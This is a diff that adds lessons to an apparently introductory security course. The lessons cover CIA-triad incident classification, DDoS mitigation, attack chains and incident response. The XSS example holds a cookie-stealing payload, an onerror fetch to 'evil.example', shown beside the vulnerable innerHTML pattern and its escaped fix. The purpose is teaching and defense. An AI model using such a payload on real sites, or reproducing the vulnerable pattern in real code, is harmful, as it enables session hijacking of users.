@@ -65,6 +65,33 @@ traffic until legitimate users can't reach it.
      needed it.`,
         },
         {
+          kind: "example",
+          heading: "A trickier fourth incident: two properties fail at once",
+          body: "Not every incident cleanly hits just one property — naming which ones, and how, is still the useful first step.",
+          code: `Incident 4: An attacker gains access to a hospital's patient
+scheduling system, quietly changes several patients' recorded
+allergy information, and also disables the on-call alert
+system so staff aren't notified of the outage until hours
+later.
+  -> Both an integrity failure (the allergy data is now
+     wrong, and nobody would know without cross-checking) and
+     an availability failure (the alert system meant to catch
+     this kind of problem quickly was itself taken down).
+  -> Confidentiality was never touched here — nothing was
+     read or exposed — which is exactly why naming the
+     specific properties matters: "we got hacked" would miss
+     that this incident's real damage has nothing to do with
+     data exposure at all, and any response focused only on
+     "who saw what" would miss the actual harm entirely, and
+     likely waste time investigating the wrong question.`,
+        },
+        {
+          kind: "callout",
+          tone: "insight",
+          heading: "Why naming the property matters more than it seems",
+          body: "It's tempting to skip straight to \"how do we fix this\" without pausing to name which property actually failed — but the fix genuinely depends on the answer. An integrity failure calls for change-detection and audit logging (so tampering gets caught, and the correct data can be restored); an availability failure calls for redundancy and capacity (so the system stays reachable even under load or attack). Reaching for a confidentiality fix — tighter access controls, more encryption — does nothing for either one. The classification step isn't academic; it's what points you at the control that actually addresses what went wrong, and it's a skill this course keeps coming back to in every later lesson on attack vectors and controls, right through to the practice exercises near the end.",
+        },
+        {
           kind: "bullets",
           heading: "A common mistake: treating \"more security\" as always meaning \"more confidentiality\"",
           intro:
@@ -116,6 +143,34 @@ traffic until legitimate users can't reach it.
           bullets: [
             "SQL injection — untrusted input concatenated directly into a database query. Prevented by parameterized queries.",
             "Cross-site scripting (XSS) — untrusted input rendered as executable code in another user's browser. Prevented by properly escaping output.",
+          ],
+        },
+        {
+          kind: "example",
+          heading: "What XSS actually looks like",
+          body: "The vulnerable version trusts a comment's text enough to insert it directly as HTML — the fixed version treats it strictly as text, never as markup the browser might execute.",
+          language: "html",
+          code: `Vulnerable (raw insertion into the page):
+  document.getElementById("comments").innerHTML += userComment;
+
+  If userComment is:
+  <img src=x onerror="fetch('https://evil.example/steal?c=' + document.cookie)">
+  Every visitor who loads this page silently sends their own
+  session cookie to the attacker's server — no click required.
+
+Fixed (rendered as text, or via a framework that escapes by default):
+  document.getElementById("comments").textContent += userComment;
+  // or, in React: {userComment} — JSX escapes interpolated values
+  // automatically, which is why raw dangerouslySetInnerHTML
+  // is a deliberate, named exception worth being suspicious of.`,
+        },
+        {
+          kind: "bullets",
+          heading: "Denial-of-service: attacking availability directly",
+          bullets: [
+            "Denial-of-service (DoS) — overwhelming a system with traffic or requests until legitimate users can't get through; a distributed denial-of-service (DDoS) does the same thing from thousands of compromised machines at once, making it far harder to block by simply filtering one source IP.",
+            "Unlike most attacks on this list, a DoS doesn't need to breach anything — it doesn't steal data or tamper with it, it purely denies access, which is exactly why it maps cleanly onto the \"availability\" leg of the CIA triad rather than confidentiality or integrity, and why the right response looks completely different from a credential or injection incident.",
+            "Mitigations layer rather than rely on one fix: rate limiting slows a single source down, a content delivery network or dedicated DDoS-mitigation service absorbs traffic before it reaches your own servers, and autoscaling buys headroom — no single one of these is sufficient alone against a well-resourced, distributed attacker willing to spend real money on it.",
           ],
         },
         {
@@ -177,10 +232,23 @@ Fixed (parameterized query):
           ],
         },
         {
+          kind: "diagram",
+          heading: "How these vectors chain together in a real attack",
+          description: "Most serious breaches aren't one vector in isolation — they're a chain, where each stage exists because the one before it succeeded.",
+          steps: [
+            { label: "1. Phishing email", detail: "An employee enters their credentials on a fake login page" },
+            { label: "2. Credential reuse check", detail: "Attacker tries the stolen password against other internal systems" },
+            { label: "3. Misconfiguration found", detail: "An internal admin panel with no MFA accepts the reused password" },
+            { label: "4. Malware / ransomware deployed", detail: "Attacker uses that access to install ransomware, targeting backups first" },
+            { label: "5. Extortion", detail: "Data is encrypted (or exfiltrated) and payment demanded" },
+          ],
+        },
+        {
           kind: "summary",
           heading: "The practical implication",
           bullets: [
             "Most real breaches exploit a known category of weakness that a fairly standard security practice would have prevented.",
+            "The most damaging breaches are rarely a single vector acting alone — they're a chain, where breaking any one link (MFA that stops the reused credential, patching that closes the misconfiguration, tested backups that defang the ransomware) can stop the whole thing.",
           ],
         },
       ],
@@ -471,15 +539,46 @@ Year 5 — account compromised via phishing:
             "What went wrong: the analyst's account has far more access than her job requires — a marketing role has no legitimate need to read HR and finance documents, but the broad \"All Staff\" group grants it anyway. This is a least-privilege failure, not just a phishing failure — the phishing email is only the trigger; the actual damage (reach into HR/finance data) came from over-broad access that had nothing to do with her actual job. Fixes: (1) Restructure group membership so \"All Staff\" grants only what every employee genuinely needs (e.g., the company directory, HR self-service for their own records) and move sensitive document access to narrower, role-specific groups — this directly limits the blast radius of any single compromised account, regardless of how it's compromised. (2) Add MFA on top of the password, so a phished password alone isn't sufficient to log in at all — this is a defense-in-depth layer independent of the access-scoping fix, so even if the least-privilege fix were somehow incomplete, this second control still blocks the specific attack described.",
         },
         {
+          kind: "practice",
+          heading: "Classify the incident and pick the control that actually addresses it",
+          prompt:
+            "A company's checkout page starts timing out for most visitors during a product launch. Logs show millions of requests per minute from thousands of distinct IP addresses, all hitting the same /checkout endpoint with no login attempt and no unusual database activity. Using the CIA triad, name which property is under attack, name the attack category from this lesson, and recommend the control that actually fits — not a generic \"add more security\" answer.",
+          hint: "No data was read or changed, and the traffic pattern comes from many sources at once, not one. What does that rule out, and what does it point to?",
+          solution:
+            "This is an availability failure, not a confidentiality or integrity one — nothing was read or altered, the system simply became unusable for legitimate visitors. The pattern (huge request volume, thousands of distinct source IPs, no credential or database activity) is the signature of a distributed denial-of-service (DDoS) attack, not credential stuffing or SQL injection, both of which would show up differently in the logs (repeated auth attempts, or malformed query patterns). The fitting control is traffic-layer: rate limiting per IP and a CDN or dedicated DDoS-mitigation service that can absorb and filter the flood before it reaches the checkout servers at all. A generic answer like \"add MFA\" or \"patch the database\" would miss entirely — those controls target confidentiality and integrity risks that aren't what's happening here; matching the control to the actual property under attack is the whole exercise.",
+        },
+        {
+          kind: "chart",
+          heading: "Checkout requests per minute, before and during the launch",
+          description: "The scale of the jump is itself a clue — this isn't a handful of curious visitors, it's a flood.",
+          chartType: "bar",
+          unit: "requests/min",
+          data: [
+            { label: "Normal traffic", value: 4000 },
+            { label: "During the incident", value: 2200000 },
+          ],
+        },
+        {
           kind: "diagram",
           heading: "Responding to the compromised account above",
-          description: "The same five stages apply whether the trigger was phishing, a leaked credential, or a misconfiguration.",
+          description: "The same five stages apply whether the trigger was phishing, a leaked credential, or a misconfiguration — and again to the DDoS incident above, adapted to an availability failure rather than an account compromise.",
           steps: [
-            { label: "Detect", detail: "Alert fires on an unusual login or access pattern" },
-            { label: "Contain", detail: "Disable the account, revoke active sessions" },
-            { label: "Eradicate", detail: "Reset credentials, close the phishing/access gap" },
-            { label: "Recover", detail: "Restore access scoped to least privilege, not the old broad grant" },
-            { label: "Review", detail: "Audit group membership so the same over-broad access can't recur" },
+            { label: "Detect", detail: "Alert fires on an unusual login or access pattern (or, for the DDoS case, on request volume and latency)" },
+            { label: "Contain", detail: "Disable the account, revoke active sessions (or engage DDoS mitigation and rate limiting)" },
+            { label: "Eradicate", detail: "Reset credentials, close the phishing/access gap (or identify and block the attacking sources)" },
+            { label: "Recover", detail: "Restore access scoped to least privilege, not the old broad grant (or restore normal service capacity)" },
+            { label: "Review", detail: "Audit group membership so the same over-broad access can't recur (or add permanent capacity/mitigation headroom)" },
+          ],
+        },
+        {
+          kind: "bullets",
+          heading: "The pattern across all four exercises in this practice lesson",
+          intro: "Different scenarios, same underlying discipline: identify precisely what's actually happening before reaching for a fix.",
+          bullets: [
+            "Read the specific evidence in front of you — the tells in an email, the traffic pattern in the logs, the exact access an account holds — rather than pattern-matching to a vague category like \"this looks like a hack.\"",
+            "Classify what actually failed (which CIA property, which attack category) before recommending a control, since the wrong classification leads straight to a control that doesn't address the real problem.",
+            "Recommend the control that matches the specific failure, not a generic \"add more security\" — a stronger password policy does nothing against a DDoS, and more encryption does nothing against an over-broad access grant.",
+            "Assume a single control isn't enough on its own — MFA plus scoped access, rate limiting plus a CDN, detection plus a tested recovery plan — because defense in depth means no individual failure is catastrophic by itself, and a determined attacker only needs one uncontested layer to get through.",
           ],
         },
         {
@@ -489,6 +588,7 @@ Year 5 — account compromised via phishing:
             "Reading a phishing email for its actual tells — urgency, generic greeting, mismatched domain, vague threat — rather than a gut 'looks official' reaction.",
             "Matching symmetric encryption, asymmetric encryption, and hashing to the job each is actually built for, instead of treating 'crypto' as one interchangeable tool.",
             "Applying least privilege and defense in depth together to reduce both how far a single compromised account can reach and how much a single control failure actually costs.",
+            "Classifying an incident by which CIA property failed before recommending a control, so the response actually addresses the failure instead of a generic notion of 'more security.'",
           ],
         },
       ],
